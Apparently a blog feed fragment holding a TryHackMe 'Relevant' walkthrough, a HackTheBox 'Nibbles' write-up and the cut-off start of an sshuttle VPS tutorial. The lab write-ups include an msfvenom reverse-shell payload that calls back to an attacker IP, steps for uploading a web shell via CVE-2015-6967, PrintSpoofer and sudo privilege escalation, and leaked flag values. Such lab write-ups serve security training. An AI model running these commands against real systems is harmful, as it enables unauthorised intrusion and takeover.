&lt;h3&gt;Nmap&lt;/h3&gt;

&lt;p&gt;As a start, we will use &lt;code&gt;nmap&lt;/code&gt; with the &lt;code&gt;-sC&lt;/code&gt; and &lt;code&gt;-sV&lt;/code&gt; flags on our target. As a reminder, these scans will do the following:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;-sC&lt;/code&gt;: equivalent to &lt;code&gt;--script=default&lt;/code&gt;. Will run default scripts on found ports/services.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-sV&lt;/code&gt;: probe open ports to determine service/version info.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Let&amp;#39;s also enumerate all ports with &lt;code&gt;-p-&lt;/code&gt; for good measure:&lt;/p&gt;

&lt;div class="highlight"&gt;&lt;pre class="highlight shell"&gt;&lt;code&gt;nmap &lt;span class="nt"&gt;-sC&lt;/span&gt; &lt;span class="nt"&gt;-sV&lt;/span&gt; &lt;span class="nt"&gt;-p-&lt;/span&gt; 10.10.126.101
Starting Nmap 7.91 &lt;span class="o"&gt;(&lt;/span&gt; https://nmap.org &lt;span class="o"&gt;)&lt;/span&gt; at 2021-03-01 13:48 CET
Nmap scan report &lt;span class="k"&gt;for &lt;/span&gt;10.10.126.101
Host is up &lt;span class="o"&gt;(&lt;/span&gt;0.029s latency&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="nb"&gt;.&lt;/span&gt;
Not shown: 65527 filtered ports
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Windows Server 2016 Standard Evaluation 14393 microsoft-ds
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: RELEVANT
|   NetBIOS_Domain_Name: RELEVANT
|   NetBIOS_Computer_Name: RELEVANT
|   DNS_Domain_Name: Relevant
|   DNS_Computer_Name: Relevant
|   Product_Version: 10.0.14393
|_  System_Time: 2021-03-01T12:51:53+00:00
| ssl-cert: Subject: &lt;span class="nv"&gt;commonName&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;Relevant
| Not valid before: 2021-02-28T12:48:34
|_Not valid after:  2021-08-30T12:48:34
|_ssl-date: 2021-03-01T12:52:32+00:00&lt;span class="p"&gt;;&lt;/span&gt; 0s from scanner time.
49663/tcp open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012&lt;span class="p"&gt;;&lt;/span&gt; CPE: cpe:/o:microsoft:windows
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;And here are the host script results ran against these findings:&lt;/p&gt;

&lt;div class="highlight"&gt;&lt;pre class="highlight shell"&gt;&lt;code&gt;Host script results:
|_clock-skew: mean: 1h36m01s, deviation: 3h34m41s, median: 0s
| smb-os-discovery:
|   OS: Windows Server 2016 Standard Evaluation 14393 &lt;span class="o"&gt;(&lt;/span&gt;Windows Server 2016 Standard Evaluation 6.3&lt;span class="o"&gt;)&lt;/span&gt;
|   Computer name: Relevant
|   NetBIOS computer name: RELEVANT&lt;span class="se"&gt;\x&lt;/span&gt;00
|   Workgroup: WORKGROUP&lt;span class="se"&gt;\x&lt;/span&gt;00
|_  System &lt;span class="nb"&gt;time&lt;/span&gt;: 2021-03-01T04:51:56-08:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled &lt;span class="o"&gt;(&lt;/span&gt;dangerous, but default&lt;span class="o"&gt;)&lt;/span&gt;
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   &lt;span class="nb"&gt;date&lt;/span&gt;: 2021-03-01T12:51:54
|_  start_date: 2021-03-01T12:48:50
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We&amp;#39;re getting a few interesting hints so far for exploitation, and also two HTTP services opened on port 80 and 49663. Let&amp;#39;s check where this might lead us.&lt;/p&gt;

&lt;h3&gt;Websites / web services&lt;/h3&gt;

&lt;p&gt;Both of the HTTP services lead us to the microsoft IIS server default page:&lt;/p&gt;

&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/tryhackme-writeup-relevant/1.jpg" alt="Screenshot of the default page for microsoft IIS server."&gt;&lt;/p&gt;

&lt;p&gt;Dirsearch results suggest something fishy. Why would we have a directory traversal vulnerability for /etc/passwd on a windows server? Looks like we might encounter some red herrings on this target.&lt;/p&gt;

&lt;div class="highlight"&gt;&lt;pre class="highlight shell"&gt;&lt;code&gt;Target: http://10.10.32.152/

Output File: /home/ovelny/repos/dirsearch/reports/10.10.32.152/_21-03-01_18-17-13.txt

&lt;span class="o"&gt;[&lt;/span&gt;18:17:13] Starting:
&lt;span class="o"&gt;[&lt;/span&gt;18:17:14] 403 -  312B  - /%2e%2e//google.com
&lt;span class="o"&gt;[&lt;/span&gt;18:17:18] 403 -    2KB - /Trace.axd
&lt;span class="o"&gt;[&lt;/span&gt;18:17:19] 403 -  312B  - /&lt;span class="se"&gt;\.&lt;/span&gt;.&lt;span class="se"&gt;\.&lt;/span&gt;.&lt;span class="se"&gt;\.&lt;/span&gt;.&lt;span class="se"&gt;\.&lt;/span&gt;.&lt;span class="se"&gt;\.&lt;/span&gt;.&lt;span class="se"&gt;\.&lt;/span&gt;.&lt;span class="se"&gt;\.&lt;/span&gt;.&lt;span class="se"&gt;\.&lt;/span&gt;.&lt;span class="se"&gt;\.&lt;/span&gt;.&lt;span class="se"&gt;\e&lt;/span&gt;tc&lt;span class="se"&gt;\p&lt;/span&gt;asswd

Task Completed
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Port 49663 doesn&amp;#39;t lead to interesting results either, as the few additional pages can&amp;#39;t be exploited for anything meaningful:&lt;/p&gt;

&lt;div class="highlight"&gt;&lt;pre class="highlight shell"&gt;&lt;code&gt;Target: http://10.10.32.152:49663/

Output File: /home/ovelny/repos/dirsearch/reports/10.10.32.152/_21-03-01_18-19-38.txt

&lt;span class="o"&gt;[&lt;/span&gt;18:19:38] Starting:
&lt;span class="o"&gt;[&lt;/span&gt;18:19:39] 403 -  312B  - /%2e%2e//google.com
&lt;span class="o"&gt;[&lt;/span&gt;18:19:54] 403 -    2KB - /Trace.axd
&lt;span class="o"&gt;[&lt;/span&gt;18:19:55] 403 -  312B  - /&lt;span class="se"&gt;\.&lt;/span&gt;.&lt;span class="se"&gt;\.&lt;/span&gt;.&lt;span class="se"&gt;\.&lt;/span&gt;.&lt;span class="se"&gt;\.&lt;/span&gt;.&lt;span class="se"&gt;\.&lt;/span&gt;.&lt;span class="se"&gt;\.&lt;/span&gt;.&lt;span class="se"&gt;\.&lt;/span&gt;.&lt;span class="se"&gt;\.&lt;/span&gt;.&lt;span class="se"&gt;\.&lt;/span&gt;.&lt;span class="se"&gt;\e&lt;/span&gt;tc&lt;span class="se"&gt;\p&lt;/span&gt;asswd
&lt;span class="o"&gt;[&lt;/span&gt;18:20:07] 200 -    0B  - /aspnet_client/
&lt;span class="o"&gt;[&lt;/span&gt;18:20:07] 301 -  163B  - /aspnet_client  -&amp;gt;  http://10.10.32.152:49663/aspnet_client/

Task Completed
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;As we saw port 445 being open, samba naturally comes next for enumeration.&lt;/p&gt;

&lt;h3&gt;SMB enumeration&lt;/h3&gt;

&lt;p&gt;At first, nmap scripts targeting SMB protocols seem to lead us to something juicy: perhaps this target is vulnerable to EternalBlue!&lt;/p&gt;

&lt;div class="highlight"&gt;&lt;pre class="highlight shell"&gt;&lt;code&gt;nmap &lt;span class="nt"&gt;-p&lt;/span&gt; 445 &lt;span class="nt"&gt;--script&lt;/span&gt; smb-protocols 10.10.32.152
Starting Nmap 7.91 &lt;span class="o"&gt;(&lt;/span&gt; https://nmap.org &lt;span class="o"&gt;)&lt;/span&gt; at 2021-03-01 18:28 CET
Nmap scan report &lt;span class="k"&gt;for &lt;/span&gt;10.10.32.152
Host is up &lt;span class="o"&gt;(&lt;/span&gt;0.044s latency&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="nb"&gt;.&lt;/span&gt;

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-protocols:
|   dialects:
|     NT LM 0.12 &lt;span class="o"&gt;(&lt;/span&gt;SMBv1&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;dangerous, but default]
|     2.02
|     2.10
|     3.00
|     3.02
|_    3.11

Nmap &lt;span class="k"&gt;done&lt;/span&gt;: 1 IP address &lt;span class="o"&gt;(&lt;/span&gt;1 host up&lt;span class="o"&gt;)&lt;/span&gt; scanned &lt;span class="k"&gt;in &lt;/span&gt;8.57 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;That would be too good to be true right? Well, that&amp;#39;s because it is. SMB1 is disabled:&lt;/p&gt;

&lt;div class="highlight"&gt;&lt;pre class="highlight shell"&gt;&lt;code&gt;smbclient &lt;span class="nt"&gt;-N&lt;/span&gt; &lt;span class="nt"&gt;-L&lt;/span&gt; &lt;span class="se"&gt;\\\\&lt;/span&gt;10.10.32.152

        Sharename       Type      Comment
        &lt;span class="nt"&gt;---------&lt;/span&gt;       &lt;span class="nt"&gt;----&lt;/span&gt;      &lt;span class="nt"&gt;-------&lt;/span&gt;
        ADMIN&lt;span class="nv"&gt;$ &lt;/span&gt;         Disk      Remote Admin
        C&lt;span class="nv"&gt;$ &lt;/span&gt;             Disk      Default share
        IPC&lt;span class="nv"&gt;$ &lt;/span&gt;           IPC       Remote IPC
        nt4wrksv        Disk
SMB1 disabled &lt;span class="nt"&gt;--&lt;/span&gt; no workgroup available
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;However, the &lt;code&gt;nt4wrksv&lt;/code&gt; share is quite unusual and seem to be worth exploring.&lt;/p&gt;

&lt;h2&gt;Relevant findings for exploitation&lt;/h2&gt;

&lt;p&gt;So far, our main lead is exploiting samba and maybe find some pieces of information that might lead us to a reverse shell.&lt;/p&gt;

&lt;h2&gt;Exploitation&lt;/h2&gt;

&lt;p&gt;Since SMB1 is disabled, EternalBlue is not even worth exploring for this target. Let&amp;#39;s connect to &lt;code&gt;nt4wrksv&lt;/code&gt; with an anonymous connection:&lt;/p&gt;

&lt;div class="highlight"&gt;&lt;pre class="highlight shell"&gt;&lt;code&gt;smbclient //10.10.143.157/nt4wrksv
Enter WORKGROUP&lt;span class="se"&gt;\o&lt;/span&gt;velny&lt;span class="s1"&gt;'s password:
Try "help" to get a list of possible commands.
smb: \&amp;gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We quickly get our eyes on a &lt;code&gt;passwords.txt&lt;/code&gt; file, immediately accessible on this share with &lt;code&gt;more passwords.txt&lt;/code&gt;&lt;/p&gt;

&lt;div class="highlight"&gt;&lt;pre class="highlight plaintext"&gt;&lt;code&gt;[User Passwords - Encoded]
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Base64 encoded... Easy fix, let&amp;#39;s decode those strings:&lt;/p&gt;

&lt;div class="highlight"&gt;&lt;pre class="highlight shell"&gt;&lt;code&gt;&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;"Qm9iIC0gIVBAJCRXMHJEITEyMw=="&lt;/span&gt; | &lt;span class="nb"&gt;base64&lt;/span&gt; &lt;span class="nt"&gt;-d&lt;/span&gt;
Bob - &lt;span class="o"&gt;!&lt;/span&gt;P@&lt;span class="nv"&gt;$$&lt;/span&gt;W0rD!123
&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;"QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk"&lt;/span&gt; | &lt;span class="nb"&gt;base64&lt;/span&gt; &lt;span class="nt"&gt;-d&lt;/span&gt;
Bill - Juw4nnaM4n420696969!&lt;span class="nv"&gt;$$$ &lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Connecting to SMB with those credentials works, but the permissions for those accounts are similar to anonymous connections. Disappointing. Bill and Bob shall not help us any further, as this seems to be another red herring.&lt;/p&gt;

&lt;div class="highlight"&gt;&lt;pre class="highlight shell"&gt;&lt;code&gt;smbmap &lt;span class="nt"&gt;-u&lt;/span&gt; Bob &lt;span class="nt"&gt;-p&lt;/span&gt; &lt;span class="s1"&gt;'!P@$$W0rD!123'&lt;/span&gt; &lt;span class="nt"&gt;-H&lt;/span&gt; 10.10.143.157
&lt;span class="o"&gt;[&lt;/span&gt;+] IP: 10.10.143.157:445       Name: 10.10.143.157
        Disk                                                    Permissions     Comment
        &lt;span class="nt"&gt;----&lt;/span&gt;                                                    &lt;span class="nt"&gt;-----------&lt;/span&gt;     &lt;span class="nt"&gt;-------&lt;/span&gt;
        ADMIN&lt;span class="nv"&gt;$ &lt;/span&gt;                                                 NO ACCESS       Remote Admin
        C&lt;span class="nv"&gt;$ &lt;/span&gt;                                                     NO ACCESS       Default share
        IPC&lt;span class="nv"&gt;$ &lt;/span&gt;                                                   READ ONLY       Remote IPC
        nt4wrksv                                                READ, WRITE
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;After some additional attempts on SMB, I gave up to focus on web services yet again. Surely there has to be something more about them...&lt;/p&gt;

&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/tryhackme-writeup-relevant/2.jpg" alt="Screenshot showing the same encoded passwords at http://IP:49663/n4twrksv/passwords.txt."&gt;&lt;/p&gt;

&lt;p&gt;And there is! Turns out all of &lt;code&gt;nt4wrksv&lt;/code&gt; contents are directly accessible through HTTP on port 49663. We might be able to get a reverse shell exactly the same way.&lt;/p&gt;

&lt;p&gt;Since those web services are all powered by IIS servers, &lt;code&gt;.aspx&lt;/code&gt; ought to be our best option as payload output:&lt;/p&gt;

&lt;div class="highlight"&gt;&lt;pre class="highlight shell"&gt;&lt;code&gt;msfvenom &lt;span class="nt"&gt;-p&lt;/span&gt; windows/x64/shell_reverse_tcp &lt;span class="nv"&gt;LHOST&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;10.9.186.16 &lt;span class="nv"&gt;LPORT&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;4444 &lt;span class="nt"&gt;-f&lt;/span&gt; aspx &lt;span class="nt"&gt;-o&lt;/span&gt; hacky.aspx
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We then upload &lt;code&gt;hacky.aspx&lt;/code&gt; to the nt4wrksv share with &lt;code&gt;get hacky.aspx&lt;/code&gt; in SMB and execute the payload through HTTP (&lt;a href="http://target-ip:49663/nt4wrksv/hacky.aspx" rel="nofollow"&gt;http://target-ip:49663/nt4wrksv/hacky.aspx&lt;/a&gt;), instantly granting us a shell to our target and access to the output of &lt;code&gt;user.txt&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Enumerating privileges on our current user instantly shows us how we will escalate our privileges to &lt;code&gt;SYSTEM&lt;/code&gt;, since having &lt;code&gt;SeImpersonatePrivilege&lt;/code&gt; enabled instantly makes this box vulnerable to PrintSpoofer64 (&lt;a href="https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/):" rel="nofollow"&gt;https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/):&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/tryhackme-writeup-relevant/3.jpg" alt="Output of &amp;quot;whoami /priv&amp;quot; command, showing that SeImpersonatePrivilege is indeed enabled on our target."&gt;&lt;/p&gt;

&lt;h2&gt;Privilege escalation&lt;/h2&gt;

&lt;p&gt;Downloading &lt;code&gt;PrintSpoofer64.exe&lt;/code&gt; was instantly doable on target&amp;#39;s default location.&lt;/p&gt;

&lt;p&gt;As always, making a quick and dirty HTTP server on our machine with &lt;code&gt;sudo python3 -m http.server 80&lt;/code&gt; works wonder.&lt;/p&gt;

&lt;p&gt;All that is left for us is to run the executable with &lt;code&gt;-i -c powershell&lt;/code&gt; flags enabled, so we can get an interactive powershell session as &lt;code&gt;SYSTEM&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/tryhackme-writeup-relevant/4.jpg" alt="Screenshot showing that &amp;quot;.\PrintSpoofer64.exe -i -c powershell&amp;quot; command granted us SYSTEM access to our target, as shown with the output of &amp;quot;whoami&amp;quot; command."&gt;&lt;/p&gt;

&lt;p&gt;Getting &lt;code&gt;Root.txt&lt;/code&gt; output is now in our hands.&lt;/p&gt;

&lt;h2&gt;Summary&lt;/h2&gt;

&lt;p&gt;This target was a nice demonstration of rabbit holes and red herrings that might be encountered during pentests. Getting clues that are either too obvious or too intricate is often a good sign that something dubious might be happening behind the scenes.&lt;/p&gt;
</content>
  </entry>
  <entry>
    <id>tag:ovelny.sh,2020-04-15:/blog/hack-the-box-writeup-nibbles/</id>
    <title type="html">HackTheBox writeup: Nibbles</title>
    <published>2020-04-15T00:00:00Z</published>
    <updated>2020-04-15T00:00:00Z</updated>
    <link rel="alternate" href="https://ovelny.sh/blog/hack-the-box-writeup-nibbles/" type="text/html"/>
    <content type="html">&lt;h2&gt;Full walkthrough&lt;/h2&gt;

&lt;p&gt;As with everything, let’s start with enumeration on this target. A full nmap scan doesn&amp;#39;t expose much with this box: only the SSH and HTTP ports are open, the latter being used by Apache.&lt;br&gt;
The target&amp;#39;s address (&lt;a href="http://10.10.10.75" rel="nofollow"&gt;http://10.10.10.75&lt;/a&gt;) just leads to a &amp;quot;hello world&amp;quot; HTML page. By checking the source code however, we can see an HTML comment leading to another critical piece present on this target: a CMS called nibbleblog.&lt;/p&gt;

&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/hack-the-box-writeup-nibbles/s_176EB22770684CE253C2829BBED040B5405102CAF5E10F54FC870A1649049458_1582542053507_1.jpg" alt=""&gt;&lt;/p&gt;

&lt;p&gt;Browsing &lt;a href="http://10.10.10.75/nibbleblog" rel="nofollow"&gt;http://10.10.10.75/nibbleblog&lt;/a&gt; leads us to the homepage of the blog, which contains nothing of value. Or does it?&lt;/p&gt;

&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/hack-the-box-writeup-nibbles/s_176EB22770684CE253C2829BBED040B5405102CAF5E10F54FC870A1649049458_1582542088176_2.jpg" alt=""&gt;&lt;/p&gt;

&lt;p&gt;Pretty strange that an image would have a .php extension indeed. Searching for vulns related to nibbleblog quickly leads to a related CVE: CVE-2015-6967.&lt;/p&gt;

&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/hack-the-box-writeup-nibbles/s_176EB22770684CE253C2829BBED040B5405102CAF5E10F54FC870A1649049458_1582542107275_3.jpg" alt=""&gt;&lt;/p&gt;

&lt;p&gt;And indeed, following the mentioned URL on our target leads to something worthwhile:&lt;/p&gt;

&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/hack-the-box-writeup-nibbles/s_176EB22770684CE253C2829BBED040B5405102CAF5E10F54FC870A1649049458_1582542126158_4.jpg" alt=""&gt;&lt;/p&gt;

&lt;p&gt;We can go through all parent directories from this URL, even though they&amp;#39;re supposed to remain private. Does it mean that other directories are exposed?&lt;br&gt;
Yes, yes it does.&lt;/p&gt;

&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/hack-the-box-writeup-nibbles/s_176EB22770684CE253C2829BBED040B5405102CAF5E10F54FC870A1649049458_1582542164787_5.jpg" alt=""&gt;&lt;/p&gt;

&lt;p&gt;Let&amp;#39;s explore. The /admin/boot/rules/ path gives us a set of rules and settings related to the CMS, one of them confirming that this version of nibbleblog is indeed absolutely vulnerable, according to all the CVEs found earlier:&lt;/p&gt;

&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/hack-the-box-writeup-nibbles/s_176EB22770684CE253C2829BBED040B5405102CAF5E10F54FC870A1649049458_1582542188280_6.jpg" alt=""&gt;&lt;/p&gt;

&lt;p&gt;Looking back to the /content directories, we can also see that the admin&amp;#39;s username is indeed... admin.&lt;/p&gt;

&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/hack-the-box-writeup-nibbles/s_176EB22770684CE253C2829BBED040B5405102CAF5E10F54FC870A1649049458_1582542205151_7.jpg" alt=""&gt;&lt;/p&gt;

&lt;p&gt;We could fire up hydra to get access to the dashboard, but a blacklist system exists in this CMS, which would make bruteforcing worthless for us:&lt;/p&gt;

&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/hack-the-box-writeup-nibbles/s_176EB22770684CE253C2829BBED040B5405102CAF5E10F54FC870A1649049458_1582542241708_8.jpg" alt=""&gt;&lt;/p&gt;

&lt;p&gt;At this point I honestly got lost: even if the CMS&amp;#39; config and settings are widely exposed, there is nothing that could give us the admin&amp;#39;s password. Which we need to make use of that CVE later on!&lt;/p&gt;

&lt;p&gt;After browsing all the files scratching my head, I gave up and googled some write-ups: turns out the admin&amp;#39;s password is just... nibbles.&lt;br&gt;
Yeah. Sometimes it&amp;#39;s just better to follow your instinct rather than looking for something fancy. Anyway, let’s move on...&lt;/p&gt;

&lt;p&gt;Executing CVE-2015-6967 can easily be done with the instructions found here: &lt;a href="https://curesec.com/blog/article/blog/NibbleBlog-403-Code-Execution-47.html" rel="nofollow"&gt;https://curesec.com/blog/article/blog/NibbleBlog-403-Code-Execution-47.html&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Here are the steps to follow:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Go to &lt;a href="http://10.10.10.75/nibbleblog/admin.php?controller=plugins&amp;action=list" rel="nofollow"&gt;http://10.10.10.75/nibbleblog/admin.php?controller=plugins&amp;amp;action=list&lt;/a&gt; and click on &amp;quot;install&amp;quot; for my image plugin.&lt;/li&gt;
&lt;li&gt;Fill up the fields with anything you want and upload a PHP web shell instead of an image.&lt;/li&gt;
&lt;li&gt;Ignore warning while uploading.&lt;/li&gt;
&lt;li&gt;Go to &lt;a href="http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php" rel="nofollow"&gt;http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php&lt;/a&gt; and enjoy your web shell!&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;For this purpose I used the following web shell, nice and simple: &lt;a href="https://github.com/nickola/web-console" rel="nofollow"&gt;https://github.com/nickola/web-console&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/hack-the-box-writeup-nibbles/s_176EB22770684CE253C2829BBED040B5405102CAF5E10F54FC870A1649049458_1582542282386_9.jpg" alt=""&gt;&lt;/p&gt;

&lt;p&gt;The user flag can now be reached: &lt;strong&gt;b02ff32bb332deba49eeaed21152c8d8&lt;/strong&gt;.&lt;br&gt;
For the root one, we&amp;#39;re gonna need some additional privesc. Running &lt;strong&gt;sudo -l&lt;/strong&gt; yields something interesting:&lt;/p&gt;

&lt;p&gt;&lt;img src="https://ovelny.sh/assets/images/hack-the-box-writeup-nibbles/s_176EB22770684CE253C2829BBED040B5405102CAF5E10F54FC870A1649049458_1582542321101_10.jpg" alt=""&gt;&lt;/p&gt;

&lt;p&gt;Our current user can run &lt;strong&gt;monitor.sh&lt;/strong&gt; at the given path as sudo without any password! We just need to make that script outputs the root flag and we will be done:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;mkdir -p /home/nibbler/personal/stuff&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;touch /home/nibbler/personal/stuff/monitor.sh&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;chmod +x /home/nibbler/personal/stuff/monitor.sh&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;echo &amp;quot;#!/bin/bash&amp;quot; &amp;gt; /home/nibbler/personal/stuff/monitor.sh&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;echo &amp;quot;cat /root/root.txt&amp;quot; &amp;gt;&amp;gt; /home/nibbler/personal/stuff/monitor.sh&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;cd /home/nibbler/personal/stuff/&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;sudo ./monitor.sh&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;And the root flag is now ours: &lt;strong&gt;b6d745c0dfb6457c55591efc898ef88c&lt;/strong&gt;.&lt;/p&gt;
</content>
  </entry>
  <entry>
    <id>tag:ovelny.sh,2019-10-24:/blog/easy-tunneling-with-sshuttle/</id>
    <title type="html">Easy tunneling with sshuttle</title>
    <published>2019-10-24T00:00:00Z</published>
    <updated>2019-10-24T00:00:00Z</updated>
    <link rel="alternate" href="https://ovelny.sh/blog/easy-tunneling-with-sshuttle/" type="text/html"/>
    <content type="html">&lt;p&gt;Sshuttle is a genius program that allows you to tunnel all of your traffic through SSH. As a result, it can act as a VPN for any machine you can SSH to. You don&amp;#39;t even need to be an admin of the distant server to achieve this. How amazing is that?&lt;/p&gt;

&lt;p&gt;Here&amp;#39;s what we want to achieve through SSH tunneling:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Easily redirect all traffic through the SSH tunnel, DNS and all UDP traffic included.&lt;/li&gt;
&lt;li&gt;Automate even more the process with some scripting.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Here&amp;#39;s what we want to &lt;strong&gt;avoid&lt;/strong&gt; by using sshuttle:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Wasting hours configuring things on the server acting as a proxy.&lt;/li&gt;
&lt;li&gt;Creating a new connection through &lt;code&gt;nmcli&lt;/code&gt; rather than being tunneled automatically.&lt;/li&gt;
&lt;li&gt;Messing things up by misconfiguring something, OpenVPN being a good example of this.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;We&amp;#39;ll still have to make a reasonably configured server for our proxy, but this will take way less time than setting up a VPN with any other tool. Let&amp;#39;s get started, with a DigitalOcean VPS.&lt;/p&gt;

&lt;h2&gt;Setting up a DigitalOcean VPS with sane defaults&lt;/h2&gt;

&lt;p&gt;First of all, create your droplet on DigitalOcean. Even if this would work for many Linux flavors, this tutorial will use Ubuntu. Pick the latest LTS version and choose to create a $5 droplet, which will be more than enough for a proxy.&lt;/p&gt;

&lt;p&gt;Choose to paste your SSH public key to login in the settings. A one-time password is hardly secure nor a good idea.&lt;/p&gt;

&lt;p&gt;Once your droplet is up and online, connect with SSH:&lt;/p&gt;

&lt;div class="highlight"&gt;&lt;pre class="highlight shell"&gt;&lt;code&gt;ssh root@my-droplet-ip
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;First thing you should do is updating this freshly created server:&lt;/p&gt;

&lt;div class="highlight"&gt;&lt;pre class="highlight shell"&gt;&lt;code&gt;apt-get update
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Then, we should work on disabling root access. Let&amp;#39;s create a new user on this server:&lt;/p&gt;

&lt;div class="highlight"&gt;&lt;pre class="highlight shell"&gt;&lt;code&gt;adduser your-user
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Give it a strong password during the creation process. Next, add this user to the sudo group:&lt;/p&gt;

&lt;div class="highlight"&gt;&lt;pre class="highlight shell"&gt;&lt;code&gt;usermod &lt;span class="nt"&gt;-aG&lt;/span&gt; &lt;span class="nb"&gt;sudo &lt;/span&gt;your-user
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;And while we&amp;#39;re at it, enable UFW (uncomplicated firewall). We&amp;#39;re gonna use it later on:&lt;/p&gt;

&lt;div class="highlight"&gt;&lt;pre class="highlight shell"&gt;&lt;code&gt;ufw &lt;span class="nb"&gt;enable&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We wanna connect through SSH with the user we just created. Just as the same way we provided our public key during the droplet creation, we now have to repeat this process for the new user. First, switch from root to the user:&lt;/p&gt;

&lt;div class="highlight"&gt;&lt;pre class="highlight shell"&gt;&lt;code&gt;su - your-user
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;And then, create a .ssh folder with the appropriate permissions:&lt;/p&gt;

&lt;div class="highlight"&gt;&lt;pre class="highlight shell"&gt;&lt;code&gt;&lt;span class="nb"&gt;mkdir&lt;/span&gt; ~/.ssh
&lt;span class="nb"&gt;chmod &lt;/span&gt;700 ~/.ssh
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;On your &lt;strong&gt;client&lt;/strong&gt; (not the server!), run the following command to get the output of your public key:&lt;/p&gt;

&lt;div class="highlight"&gt;&lt;pre class="highlight shell"&gt;&lt;code&gt;&lt;span class="nb"&gt;cat&lt;/span&gt; ~/.ssh/id_rsa.pub
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Then paste it in the following file on the server:&lt;/p&gt;

